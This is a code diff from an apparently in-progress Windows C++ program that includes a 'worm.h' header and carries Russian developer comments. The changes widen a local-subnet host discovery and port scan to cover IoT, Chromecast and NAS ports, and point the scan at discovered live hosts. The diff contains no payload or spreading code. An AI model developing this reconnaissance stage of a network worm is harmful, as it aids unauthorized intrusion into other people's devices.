@@ -1,3 +1,4 @@
+
 #include "worm.h"
 #include "NetUtils.h"
 #pragma comment(lib, "Ws2_32.lib")
@@ -36,8 +37,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 		auto range = generate_ip_range(ip, mask); // теперь правильно
 		for (const auto& ip_ws : range) {
-			bool host_bool = is_host_alive(ip_ws); // = is_host_alive(ip_ws); // поменять (раскомментировать)
-			std::wcout << ip_ws << L" " << host_bool << std::endl;
+			bool host_bool = is_host_alive(ip_ws); // 0 <-> is_host_alive(ip_ws); // поменять (раскомментировать)
+			std::wcout << ip_ws << L" " << host_bool << std::endl;// удалить
 			if (host_bool) {
 				alive_ip.push_back(ip_ws);
 			}
@@ -68,22 +69,33 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	3306,  // MySQL
 	3389,  // RDP
 	5357,  // еще какой то порт
-	5432   // PostgreSQL
+	5432,   // PostgreSQL
+	8443, // HTTPS админка / IoT интерфейсы
+	8008, //Chromecast HTTP
+	8009, //Chromecast CAST/DIAL
+	9000, //Sonos / Plex / NAS
+	5353 
 	};
 
 	vector<wstring> ip_vector = { L"192.168.0.147", L"192.168.0.1", L"192.168.0.184", L"192.168.0.187"}; // удалить 
 
 
-	for (wstring& ip : ip_vector) { // alive_ip -> ip_vector // поменять
+	for (wstring& ip : alive_ip) { // alive_ip <-> ip_vector // поменять
+		wcout << L"проверяем " << ip << endl; // удалить
 		for (int port : critical_and_popular_ports) {
 			bool test_port = is_port_open(ip, port);
 			if (test_port) {
 				wcout << ip << " " << port << endl; // удалить
+
+				// часть со сканированием портов
+				
+
+
 			}
 		}
 	}
 
-
+	
 
 
 
